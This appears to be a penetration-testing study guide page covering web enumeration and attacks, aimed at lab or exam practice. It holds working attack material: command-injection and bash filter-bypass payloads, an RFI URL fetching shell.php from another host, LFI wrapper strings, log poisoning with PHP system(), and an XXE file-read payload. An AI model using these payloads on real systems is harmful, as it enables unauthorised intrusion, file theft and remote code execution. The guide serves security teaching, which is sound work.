# Web

![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-MJOTqJ9Kdy3dIFdYcWY%2F-MJOTysqaRR8JH\_lJByq%2FWeb%20Enumeration\_OffSecNewbie.com.png?alt=media\&token=6649d0e1-b5b5-4f44-b508-f06463fdf05f)

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

[Tools/test-group/automated-tools](https://guide.offsecnewbie.com/test-group/automated-tools)

## HTTPS <a href="#https" id="https"></a>

If you get a certificate redirecting you to 443/https check for alt names![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LmAPTQFRFuYL8Au2w4o%2F-LmAPwWxje2lAdcsinij%2Fimage.png?alt=media\&token=b012c5e8-64bb-4e2b-9c5d-3890938fde97)add these to /etc/hosts file

```
nikto -h $ipnikto -h $ip -p 80,8080,1234 #test different ports with one scan
```

```
-Tuning Options0 – File Upload1 – Interesting File / Seen in logs2 – Misconfiguration / Default File3 – Information Disclosure4 – Injection (XSS/Script/HTML)5 – Remote File Retrieval – Inside Web Root6 – Denial of Service7 – Remote File Retrieval – Server Wide8 – Command Execution / Remote Shell9 – SQL Injectiona – Authentication Bypassb – Software Identificationc – Remote Source Inclusionx – Reverse Tuning Options (i.e., include all except specified)
```

```
wget https://raw.githubusercontent.com/danielmiessler/RobotsDisallowed/master/top10000.txt; gobuster dir -u http://$ip -w top10000.txt
```

use a few different files, check seclists for web discovery

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 http://$ip/FUZZ
```

It is worth scanning using a good number of word lists as well as scanning the directories recursively - which takes time. Its good to refer back to your findings when you're stuck. It may help you find where shells have been uploaded to.

```
https://github.com/PinkP4nther#follow guide, might have to run these commands if guide doesnt work then re run guideapt install cargo, apt install pkg-config./erodir -u http:/$ip -e /usr/share/wordlists/dirb/common.txt -t 20
```

```
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o gobuster-root -t 50
```

#### Gobuster ing a site with an auth - 401 <a href="#gobuster-ing-a-site-with-an-auth-401" id="gobuster-ing-a-site-with-an-auth-401"></a>

```
gobuster dir -u http://$ip/authlogin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -U usernamehere -P passwordhere -t 100
```

If Gobuster throws back lots of pages that you know are not valid. The webpage is likely filtering the requests by USER AGENT. Its checking the user agent of gobuster and telling it to respond to all requests as valid. Use the -a flag on Gobuster to set the USER AGENT.

works recursively

```
cd /root/dirsearch; python3 dirsearch.py  -u http://$ip/ -r -e .php
```

#### If really stuck run this <a href="#if-really-stuck-run-this" id="if-really-stuck-run-this"></a>

```
for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/$file -e -k -l -s "200,204,301,302,307" -t 20 ; done
```

#### Banner grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

```
./whatweb $ip # identifies all known services
```

#### Methods testing <a href="#methods-testing" id="methods-testing"></a>

```
nmap --script http-methods --script-args http-methods.url-path='/test' $ip
```

#### Brute Forcing authentication <a href="#brute-forcing-authentication" id="brute-forcing-authentication"></a>

```
hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
```

#### Vulnerability scanning: <a href="#vulnerability-scanning" id="vulnerability-scanning"></a>

```
nmap --script=http-vuln* $ip 
```

#### Test against SQLI <a href="#test-against-sqli" id="test-against-sqli"></a>

```
sqlmap -u "http://$ip/?query" --data="user=foo&pass=bar&submit=Login" --level=5 --risk=3 --dbms=mysql  
```

#### Coldfusion vulnerability scanning <a href="#coldfusion-vulnerability-scanning" id="coldfusion-vulnerability-scanning"></a>

```
nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip
```

If you can **register yourself** on the site like a normal users - do this. There maybe an upload feature of the site which you can take advantage of.

### Backup files search <a href="#backup-files-search" id="backup-files-search"></a>

[mazen160/bfacBFAC (Backup File Artifacts Checker): An automated tool that checks for backup artifacts that may disclose the web-application's source code. - mazen160/bfacgithub.com](https://github.com/mazen160/bfac.git)

```
./bfac --url http://$ip/ --level 4
```

### WebDav <a href="#webdav" id="webdav"></a>

if you manage to download a backup file. Grep for users - as there might be a password beside the username. Ie logging into a database which you can copy and use to log in to ssh.

Test for it

```
davtest -move -sendbd auto -url http://$ip:8080/webdav/
```

```
cadaver http://$ip:8080/webdav/
```

## DNS Enumeration <a href="#dns-enumeration" id="dns-enumeration"></a>

```
host -t ns $website #gets nameservershost -t mx $website #gets mail servers
```

### Forward DNS Lookup Bruteforce <a href="#forward-dns-lookup-bruteforce" id="forward-dns-lookup-bruteforce"></a>

guess valid names of servers by attempting to resolve a given name

Get possible IP range from above to discover more hostnames and ip addresses belonging to $website using below

```
for i in $(cat /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100K.txt); do host $i.$website | grep "has address" | cut -d" " -f1 ;done
```

### Reverse DNS Lookup Bruteforce <a href="#reverse-dns-lookup-bruteforce" id="reverse-dns-lookup-bruteforce"></a>

might find missing domain names in the forward lookup by probing the IP address range.

```
for ip in $(seq 1 10); do host $199.199.199.$ip > network.txt; cat network.txt | grep "$website" | cut -d" " -f5; done #need to change some variables
```

### DNS Zone Transfer <a href="#dns-zone-transfer" id="dns-zone-transfer"></a>

Like a database replication act between dns servers. Should be limited to authorised secondary dns servers - misconfigured will allow zone transfer! Can give complete map of internal and external network structure

```
#!/bin/bash#identifies name servers and attempts zone transfer on each of them if [ -z "$1" ]; thenecho "[*] Zone Transfer Script"echo "[*] Usage: $0 <domain name>"exit 0fi​for server in $(host -t ns $1 | cut -d" " -f4);do​host -l $1 $server | grep "has address"done
```

```
test using ./$scriptname zonetransfer.me
```

```
dnsrecon -d $website -t axfr
```

Is target protected by WAF? may stop responding if probed too hard

* Map the attack surface
* Find subdomains, Ip blocks, email addresses, the harvester is a nice tool. I.e: **python theHarvester.py -d example.org -n -c -t -b google**
* There is a nice collection of OSINT tools at **http://osintframework.com/** feed the harvester results there and recurse.
* Find services, Banners and versions. Research CVEs and **exploit-db** for those.
* Find newest features, and forgotten endpoints at **https://web-beta.archive.org**
* Check **robots.txt** **crossdomain.xml** and **clientaccesspolicy.xml**
*   Find hosts:

    ```
    dig $website a; @8.8.8.8 # types: a, mx, ns, soa, srv, txt, axfr
    ```

    ```
    dig -x $website # reverse lookup
    ```
* Google **site:** to find information leakage
* Map their infrastructure: middleware, programming languages, backends, services. This can help **https://wappalyzer.com/**
*   Find hidden folders, files. Nice list for fuzzing content discovery: **https://c.darenet.org/nitemare/SecLists/tree/master/Discovery/Web\_Content**

    ```
    dirb http://target wordlists/dirb/common.txt
    ```

    ```
    nikto -host http://target
    ```
* Spider/map all the functionalities of the application, discover hidden & default content, doing automated and manual crawling.
* Identify data entry points, technologies used. What does the application do? How does it do it? Map attack surface, dangerous functionalities, how they are implemented. Versions of the libraries, frameworks and known CVEs.
* Read the client code of the web app, what javascript libraries it use, code looks messy?, sinks, etc
* Check comments in source of all pages
* Generate an error page, sometimes vulnerable to XSS.
  * ​[https://www.youtube.com/watch?v=cbmBDiR6WaY](https://www.youtube.com/watch?v=cbmBDiR6WaY)​
* Identify all parameters. Document which parameters are used for **GET** and **POST**.
* Identify where cookies are set, modified or added to.
*   Note any strange headers

    ```
    ./whatweb $website 
    ```

    ```
    dirb https://$website /usr/share/wordlists/dirb/common.txt 
    ```
* Use Shodan for finding similar apps and endpoints, SSH hash keys
* Find previous vulnerabilities of the web site. Recon-ng is a useful tool; **use recon/domains-vulnerabilities/xssposed; set source example.org; run**
* RTFM - Read the manual for the application you are testing, does it have a dev mode? is there a **DEBUG=TRUE** flag that can be flipped to see more?
* Look for where you can put data, is it an API? Is there a paywall or sign up? Is it purely unauthenticated?
* Look at the application from a bad guy perspective, what does it do? what is the most valuable part? Some applications will value things more than others, for example a premium website might be more concerned about users being able to bypass the pay wall than they are of say cross-site scripting.
* Look at the application logic too, how is business conducted?
* If testing a bug bounty, look for new acquisition, code from new team, new mobile apps versions, new UI in web, new features.

## Extensions List <a href="#extensions-list" id="extensions-list"></a>

```
.asp.aspx.bat.c.cfm.cgi.css.com.config.dll.exe.htaccess.htm.html.inc.jhtml.js.jsa.jsp.log.mdb.nsf.pcap.phar.php.php2.php3.php4.php5.php6.php7.phps.phpt.pht.phtml.pl.reg.sh.shtml.sql.swf.txt.xml
```

## Testing input validation <a href="#testing-input-validation" id="testing-input-validation"></a>

* Append **.old** or **.bak** to files
* Run automated scanning against web app, Burp, nikto and dirb.
* Use wpscan to assess wordpress plugins
* Use cmsmap for durpal and joomla known bugs
* Flashbang to decode swf files, online tool
* Find parameters being **reflected** and test for: **XSS**, **HPP**, **link manipulation**, **template injection**.
* Test server side issues (error-based, blind, outband, stored, different context(numeric, single and double quoted)) such as: **SQL injection**, **Server-side include**, **OS command injection**, **path traversal**, **file inclusion**both local and remote, **SMTP injection**, **SOAP injection** get the application to respond to SOAP, this ties into XXE attacks too. **LDAP injection**, **XPath injection**, **code injection**, **deserialization** attacks, **overflow** attacks.
* A parameter looks like a file? Test **path traversal**, **RFI**, **LFI**
* A parameter looks like a URL? Test **open redirection** **SSRF**
  * http://$ip/s3cr3tscr4per.php?command=
* Parsing of XML, JSON, or any other markup language that the application processes. Test for **injection attacks**, **SSRF**, **xpath**, **XXE**, **insecure object de-references**.
* Look for parameters encoded in base64 or others, test again for injection attacks and insecure object de-references.
* Check for DOM-based attacks - open redirection, cross site scripting, client side validation.
* File uploads. SVG can have embedded XML that triggers SSRF, XXE.
* If user has profile and avatar, upload a malicious SVG with script.

## Server issues <a href="#server-issues" id="server-issues"></a>

* Script to request every https request to http
* Test **header injection**
* Test HTTP Options, use arbitrary method names to attempt to bypass authentication pages
* Test any client side applet such as flash, activex and silverlight.
* For file uploads functionalities, look for reflected file download. Uploading files with double extensions (.php5.jpeg) and using a null byte (.php5%00.jpeg)
* Ensure anti-CSRF mitigations are in place for main functionalities and clickjacking mitigations.
* If there is a binary, and runs as root, it should use https only and verify checksum or singed check with public key
* Captcha bypassing
* Check for frame injection, frame busting(can still be an issue)
* Caching poisoning issues
* Sensitive data in URL parameters
* Follow up any information leakage
* Look at numeric IDs, they can tell you much many orders, users etc. Looked for hashed numeric ids
* Look swf they are always vulnerable
* Check for weak SSL ciphers
* Test **CORS policy**. if CORS or crosssdomain.xml allow subdomain, you can trick a user into doing XSS to that page by injecting an iframe to all web pages he visits to a subdomain i.e. sub.vulnerable.com, intercepting all requests for that host and returning html that will issue a cross domain request to vulnerable.es and display it to the UI.
* Verify Content Security Policy (CSP). Look for bypasses
* Verify HTTP Strict Transport Security (HSTS)
* Verify X-XSS-Protection
* Verify X-Content-Type-Options
* Verify HTTP Public Key Pinning

## Testing authentication <a href="#testing-authentication" id="testing-authentication"></a>

* Burp extension to see what users can see (authorization)
*   basic auth brute force:

    ```
    nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/ $website
    ```
* Password quality rules, length, character set allowed (alphanumeric, upper/lower case and special characters). Empty Password? Empty username? 123456?
* Test username enumeration
* Test account recovery functionality, look for SMTP header injection.
* Does remember me expires?
* Test removing your email address from your account, add a new one, make sure that the old one can not be used to recover password/log in.
* Delete an account without entering password or other sensitive operations, in case you forgot your computer logged in.
* Password bruteforcing resilience. Application locks after some attempts?
* Rate limiting in change password functionality, forgot to log out in a cyber cafe, brute force the actual password using this feature. Does the application lock out an account after x number of login attempts?
* Email verification links through http
* Cookies: scope, httponly, secure flag.
* Broken OAuth authentication, make sure ID tokens generated by google or third party are properly validated on the backend. **https://developers.google.com/identity/sign-in/web/backend-auth#verify-the-integrity-of-the-id-token**
* Other strange access control methods such as referral validation (which can be bypassed **https://t.co/z84ajd7bmO**)
* Does the remember me function ever expire? Is there room for exploit-ability in cookies combined with other attacks?
* Test username uniqueness
* How are logins processed, are they sent over http? Are details sent in a POST request or are they included in the URL(this is bad if they are, especially passwords)?
* Test NULL **%00** characters in the username and password fields.
* Test for fail-open conditions. Fail-open authentication is the situation when the user authentication fails but results in providing open access to authenticated and secure sections of the web application to the end user.
* Cookie poisoning. Try requesting the cookie names in the query string and body, some servers might read the parameters and set them as cookies. This can allow cookie poisoning.
* Set new password with old password

## Testing session management <a href="#testing-session-management" id="testing-session-management"></a>

* How well are sessions handled, is there a randomness to the session cookie? Are sessions killed in a reasonable time or do they last forever? Does the app allow multiple logins from the same user(is this significant to the app?).
* Test tokens for meaning
* Are tokens generated predictable or do they provide a sufficiently random value, tools to help with this are Burp Suite's sequencer tool.
* Check for insecure transmission of tokens Can they be accessed by JavaScript? Is this an Issue?
* Check for disclosure of tokens in logs. Are they cached server side? Can you view this? Can you pollute logs by setting custom tokens?
* Check mapping of tokens to sessions. Is a token tied to a session, or can it be re-used across sessions?
* Check session termination
* Check for session fixation
* Can an attacker hijack a user's session using the session token/cookie?
* Check for XSRF
* Can authenticated actions be performed within the context of the application from other websites?
* Check cookie scope. Is the cookie scoped to the current domain or can it be stolen, what are the flags set? is it missing secure or http-only? This can be tested by trapping the request in burp and looking at the cookie.
* Understand the access control requirements. How do you authenticate to the application, could there be any flaws here?
* Test effectiveness of controls, using multiple accounts if possible
* Test for insecure access control methods (request parameters, Referrer header, etc)

PUT Method

```
nmap --script=http-put --script-args http-put.url='/rowbot/shell.php',http-put.file='shell.php' $ip
```

* Persistent cookies
* Session tokens strength
* Authorization properly enforced

## Testing business logic <a href="#testing-business-logic" id="testing-business-logic"></a>

* I do this step last, as it is when I am more familiar with the application and more likely to identify these issues.
* Identify the logic attack surface
* What does the application do, what is the most value, what would an attacker want to access?
* Test transmission of data via the client
* Is there a desktop application or mobile application, does the protocols used vary between this and the web application
* Test for reliance on client-side input validation
* Does the application attempt to base it's logic on the client side, for example do forms have a maximum length client side that can be edited with the browser that are simply accepted as true?
* Test any thick-client components (Java, ActiveX, Flash)
* Does the application utilize something like Java, Flash, ActiveX or silverlight? can you download the applet and reverse engineer it?
* Test multi-stage processes for logic flaws. Can you go from placing an order straight to delivery thus bypassing payment? or a similar process?

## Cache attacks <a href="#cache-attacks" id="cache-attacks"></a>

* Poisoning (if only path is validated you can submit malicious queries/headers) and cache bad results
* Race conditions: buy twice, get someone else's data
* If header injection: Inject a new response, the cache might store the attacker-controllable one
* Using multiple host headers or X-Forwarded-Host might cause the cache to load the attacker's site and serve it. Or the links to be written relative to the attackers host.
* **Dns cache poisoning**: The attacker creates a fake response to the DNS server that is cached, all users will get the wrong response until TTL.
* **Side-channel attacks** They exploit timing/energy consumption/noises/electromagnetic leaks rather than a direct weakness in the system.
* **Offline Web Application Cache Poisoning** The attacker loads an iframe of victim who uses wifi. The iframe points to facebook.com but caches the phishing site for a few days. When the user logs in at home it opens the cached poisoned site.

## Links <a href="#links" id="links"></a>

Search for links on the webpages. These can give you ways to get LFI eg

```
https://github.com/GerbenJavado/LinkFinder
```

![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LvQ3FCuC-4z8AEnPuvY%2F-LvQ3ISOruMkx5uHp-3a%2Fimage.png?alt=media\&token=a73d2da1-5045-48a4-9a9f-8cb471c7b25d)

## Others <a href="#others" id="others"></a>

### Testing wordpress sites <a href="#testing-wordpress-sites" id="testing-wordpress-sites"></a>

```
wpscan --url http://$ip/ --enumerate ap,at,tt,cb,dbe,u,m#aggressive scan really checks for plugins - worth doing if nothing else comes up!wpscan -e --enumerate ap --plugins-detection aggressive --url $ip​​#check for pageswfuzz -c -z range,1-1000 --sc 200 "http://$ip/?p=FUZZ"​#check for attachmentswfuzz -c -z range,1-1000 --sc 200 "http://$ip/?attachment_id=FUZZ"
```

### Quick wordpress bruteforce: <a href="#quick-wordpress-bruteforce" id="quick-wordpress-bruteforce"></a>

```
python patator.py http_fuzz url=http://$ip/wp-login.php  raw_request=rawlogin 0=/usr/share/rockyou.txt -l /tmp/login &; tail -f /tmp/login | grep 302
```

### Fingerprint application <a href="#fingerprint-application" id="fingerprint-application"></a>

```
clusterd --fingerprint  -i $ipBlindElephant.py $ip
```

### Request site with specific cipher <a href="#request-site-with-specific-cipher" id="request-site-with-specific-cipher"></a>

```
curl --ciphers ECDHE-RSA-AES256-SHA https://$ip
```

### Deobfuscate JS <a href="#deobfuscate-js" id="deobfuscate-js"></a>

```
JStillery, JSNicehttps://beautifier.io/
```

## OAuth2 <a href="#oauth2" id="oauth2"></a>

* Allows a server to authenticate a user without any password. The app uses a service provider to authenticate users.
* Authentication flow:
  * User clicks login with Facebook.
  * User gets redirected to Facebook **facebook.com/oauth?redirect\_uri=target.com%2fcallback\&state=xyz**
  * If the login is successful, he will be redirected to target.com
  * browser makes a request to including the state value
  * Client should validate the state value to prevent csrf.
* Pitfalls:
  * CSRF: use the redirect URL that contains the authorisation code and make a victim visit it
  * Open redir: attacker constructs and authorisation request URL for provider site with redirect\_uri set to attacker.com, when user gets redirected attacker can read authorisation code
  * Access token reuse: evil consumer site can authorise victim in provider site using access token, attacker uses the token to impersonate

## DNS Rebinding <a href="#dns-rebinding" id="dns-rebinding"></a>

* Attacker controls the authoritative nameserver for attacker.com
* User visits attacker.com
* NS responds with A record with the attacker.com IP, and short TTL
* The browser fetches a resource, i.e. **/secrets**
* The DNS response has expired, now the DNS server responds with victim.com IP.
* The browser will fetch **victim.com/secrets** in the attacker.com origin.
* Attacker can return a CNAME entry to brute force internal host names

## Cross domain requests <a href="#cross-domain-requests" id="cross-domain-requests"></a>

* Browser will do GET requests and POST that has standard content-type
* Otherwise, the browser will do an OPTIONS request and check the CORS headers

## Command Injection on web forms <a href="#command-injection-on-web-forms" id="command-injection-on-web-forms"></a>

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits
```

Some php forms have limited blacklisting. It's important to check. It might be possible inject commands into it.

```
; whoami;whoami& whoami| whoami|whoami
```

If you trying to read a file and `cat` is disallowed use another program to read files like `less` or `more`![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12FfLGcf3\_o1bl3Wg1%2Fimage.png?alt=media\&token=92102fc3-6f05-4793-b17a-2d2791dc0fc6)![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12K4GoXabyy1OZW6SI%2Fimage.png?alt=media\&token=78eeafac-8472-4c39-a0b2-584cc91f2fb8)no sanitisation

### No sanitisation of user input <a href="#no-sanitisation-of-user-input" id="no-sanitisation-of-user-input"></a>

If there is no sanitisation a simple `;` or `&` will concatenate commands together

```
; whoami
```

![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12G3TENshSqAGlueu2%2Fimage.png?alt=media\&token=e0d48644-99e5-45b4-88cb-83ad37949d8d)

### Some sanitisation of user input <a href="#some-sanitisation-of-user-input" id="some-sanitisation-of-user-input"></a>

![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12KJCd5YNNoT6Ehdhd%2Fimage.png?alt=media\&token=92933cb4-9d14-448c-b080-4e74a01fc79a)some blacklisted characters

To get around the above blacklist try a pipe command![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12HKHAwPjcmGMQNQCh%2Fimage.png?alt=media\&token=2668b338-0437-4206-8f51-29ae67bf1f51)

### More sanitisation of user input <a href="#more-sanitisation-of-user-input" id="more-sanitisation-of-user-input"></a>

![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12Kdu1\_RNT2R1-bzNw%2Fimage.png?alt=media\&token=403e77fd-a942-45b8-8749-bb3e57ed9fa6)

Highlighted above is a mistake. The pipe symbol AND a space are filtered allowing the below command to work![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12HzxOCUJ3e-uTYo--%2Fimage.png?alt=media\&token=47c11a04-71dc-480f-aba8-fcc1f5a34a75)

### Proper sanitisation of user input <a href="#proper-sanitisation-of-user-input" id="proper-sanitisation-of-user-input"></a>

![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M12F5cQmW3\_3ruCt\_CX%2F-M12L5l2hvvQwAZ2PxQz%2Fimage.png?alt=media\&token=afa58970-e2fd-459e-84e9-a2107382937b)

## Bypass Bash Restrictions <a href="#bypass-bash-restrictions" id="bypass-bash-restrictions"></a>

### Bypass Paths and forbidden commands <a href="#bypass-paths-and-forbidden-commands" id="bypass-paths-and-forbidden-commands"></a>

```
#Bash substitudes * fror any possible chat that refers to a binary in the folder/usr/bin/p?ng #This equals /usr/bin/ping​#Bash substitudes * fror any compatible combination with a binary in the folder/usr/bin/who*mi #This equals /usr/bin/whoami​#[chars]/usr/bin/n[c] #/usr/bin/nc​#Concatenation'p'i'n'g #Equals to call ping"w"h"o"a"m"i\u\n\a\m\e \-\a​#Uninitialized variables: A uninitialized variable equals to null (nothing)p${u}i${u}n${u}g #Equals to ping, use {} to put the uninitialized variables between valid characterescat$u /etc$u/passwd$u #Use the uninitilized variable without {} before any symbol​#Fake commandsp$(u)i$(u)n$(u)g #Equals to ping but 3 errors trying to exeute "u" are shownw`u`h`u`o`u`a`u`m`u`i #Equals to whoami but 5 errors trying to exeute "u" are shown​#Concating strings using history!-1 #This will be substitude by the last command executed, and !-2 by the penultimate commandmi #This will throw an errorwhoa #This will throw an error!-1!-2 #This will execute whoami​
```

### Bypass forbidden spaces <a href="#bypass-forbidden-spaces" id="bypass-forbidden-spaces"></a>

```
##{form}{cat,lol.txt} #This will cat the file​##IFS - Internal field separator, change " " for any othe character ("]" in this case)#IFS withut modificationscat${IFS}/etc/passwdcat$IFS/etc/passwd​#Put the command line in a variable and then execute itIFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$bIFS=];b=cat]/etc/passwd;$b #Using 2 ";"IFS=,;`cat<<<cat,/etc/passwd` #Using cat twice#Other way, just change each space for ${IFS}echo${IFS}test​##Using hex formatX=$'cat\x20/etc/passwd'&&$X​##New linesp\i\n\g #This 4 lines will equal to ping​##Undefined variables and !$u $u#This will be saved in the history and can be used as a space, please notice that the $u variable is undefineduname!-1\-a #This equals to uname -a
```

## PHPINFO() <a href="#phpinfo" id="phpinfo"></a>

```
file_uploads	On	On
```

to be updated - please get in contact to help complete

Useful information can be extracted from this page. Settings have been set in the loaded php.ini file.

Look for `register_globals` and `allow_url` - can allow LFI and RFI attacks.

Remember you may have to add a null byte %00 e.g. $website/../../etc/passwd%00

## php.ini <a href="#php-ini" id="php-ini"></a>

RFI works only when the following is set in the php.ini file

```
allow_url_fopen = On allow_url_include = On
```

```
=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ ini_file,show_source
```

can be used if this is found on the phpinfo() page

```
disable_functions    no value
```

If there is a bit of code that include the following, this allowed RFI,

```
<?php include($_REQUEST["urlConfig"]); ?>
```

```
eghttp://10.10.106.72/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.5.219/shell.php
```

## File Inclusion (LFI) <a href="#file-inclusion-lfi" id="file-inclusion-lfi"></a>

To check if website is vulnerable write ../ in after the parameter like this `http://$ip/index.php?id=../` and if you got \[function.include] then the website may be vulnerable.

### `proc/self/environ` <a href="#proc-self-environ" id="proc-self-environ"></a>

So after getting the error remove ../ and replace with it /etc/passwd like `http://$ip/index.php?id=/etc/passwd` if you got another \[function.include] then add **../** until you got many text ( http headers ) then the site is vulnerable so after you find the passwd file we have to replace **`/etc/passwd`** it to be `/proc/self/environ`so the url will be something like this `http://$ip/index.php?id=/proc/self/environ`

Now change your user agent to the first created user agent that contain **`<?php phpinfo(); ?>`** and reload the page , if you got a text similar to **PHP VERSION** then you know you have code execution.

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-phpinfohttps://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
```

### Capture rsa\_key <a href="#capture-rsa_key" id="capture-rsa_key"></a>

Check `/etc/passwd` for user. Key stored in `/home/user/ssh/id_rsa.` Copy key to kali, do chmod 600, then `ssh user@ip -i key`

### Using Wrappers <a href="#using-wrappers" id="using-wrappers"></a>

#### php://filter <a href="#php-filter" id="php-filter"></a>

```
https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
```

```
?page=php://filter/read=string.rot13/resource=index.php?page=php://filter/convert.base64-encode/resource=index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

#### zip <a href="#zip" id="zip"></a>

```
?page=zip://shell.jpg%23payload.php
```

#### data <a href="#data" id="data"></a>

```
?page=data://text/plain;base64,[base64_encode_shell]
```

#### expect:// <a href="#expect" id="expect"></a>

```
?page=expect://id?page=expect://ls
```

#### input:// <a href="#input" id="input"></a>

```
?page=php://input | POST DATA: 
```

#### wfuzz command <a href="#wfuzz-command" id="wfuzz-command"></a>

```
 wfuzz -u "http://$ip/page.php?command=FUZZ" -w /opt/LFISuite/pathtotest_huge.txt 
```

### dotdotpwn <a href="#dotdotpwn" id="dotdotpwn"></a>

#### HTTP Module <a href="#http-module" id="http-module"></a>

```
http://www.effecthacking.com/2017/04/dotdotpwn-directory-traversal-fuzzing-tool.html
```

```
./dotdotpwn.pl -m http -h 192.168.1.1 -x 8080 -f /etc/hosts -k "localhost" -d 8 -t 200 -s
```

```
./dotdotpwn.pl -m http -h 192.168.1.1 -O -X -M POST -e .php -E
```

#### HTTP URL Module <a href="#http-url-module" id="http-url-module"></a>

```
./dotdotpwn.pl -m http-url -u http://192.168.1.1:10000/unauthenticated/TRAVERSAL -O -k "root:" -r webmin.txt
```

#### FTP Module <a href="#ftp-module" id="ftp-module"></a>

```
./dotdotpwn.pl -m ftp -h 192.168.1.1 -s -U nitr0us -P n1tr0u5pwnzj00 -o windows -q -r ftp_server.txt
```

#### TFTP Module <a href="#tftp-module" id="tftp-module"></a>

```
./dotdotpwn.pl -m tftp -h 192.168.1.1 -b -t 1 -f windows/system32/drivers/etc/hosts
```

#### Payload Module <a href="#payload-module" id="payload-module"></a>

```
./dotdotpwn.pl -m payload -h 192.168.1.1 -x 10000 -p payload_sample_1.txt -k "root:" -f /etc/passwd
```

#### STDOUT Module <a href="#stdout-module" id="stdout-module"></a>

good for producing a list of LFIs to try, maybe on another tool

```
./dotdotpwn.pl -m stdout -d 5
```

### Log poisoning <a href="#log-poisoning" id="log-poisoning"></a>

If you can find files which you can poison like `/var/logs/auth.log` you can do this by connecting to SSH like this `ssh '<?php system($_GET['c']); ?>'@$ip` then do `http://$ip/../../var/logs/auth.log?c=whoami` to get RCE

```
https://www.hackingarticles.in/ha-natraj-vulnhub-walkthrough/
```

### Useful LFI list <a href="#useful-lfi-list" id="useful-lfi-list"></a>

a big list of useful lfi paths

you might have to customise this list - for example if wordpress is located in /blog/ directory edit the top line of this file to `/var/www/html/blog/wp-config.php`

edit the file to include what file your searching for eg

`grep resource /scripts/useful/lfi.list php://filter/read=string.rot13/resource=index.php php://filter/convert.base64-encode/resource=index.php pHp://FilTer/convert.base64-encode/resource=index.php php://filter/convert.base64-encode/resource=../../../../../etc/passwd`

and possibly replace it with a resource you know, for example upload, if there is an `/upload.php` file

```
wget https://raw.githubusercontent.com/rowbot1/lfi.list/master/list.list
```

#### wfuzz <a href="#wfuzz" id="wfuzz"></a>

```
wfuzz -u "http://$ip/file.php?command=file://FUZZ" -w lfi.list
```

you might have to customise this list - for example if wordpress is located in /blog/ directory edit the top line of this file to /var/www/html/**blog**/wp-config.php

```
 https://github.com/rowbot1/lfi.list
```

## XXE <a href="#xxe" id="xxe"></a>

Complete all fields on the form. When the form is processed it might output what you added to the form - maybe one field. If it does this is the field to add the XXE part - "\&xxe;"![](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LrwxKMzNxvaHYJ-OY10%2F-Lrx3RPd9bjsDod-I1Mn%2Fimage.png?alt=media\&token=f783336e-69fd-4b87-bc39-b26d5ca91d0c)

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Version>        <email>&xxe;</email>​</Version>​
```
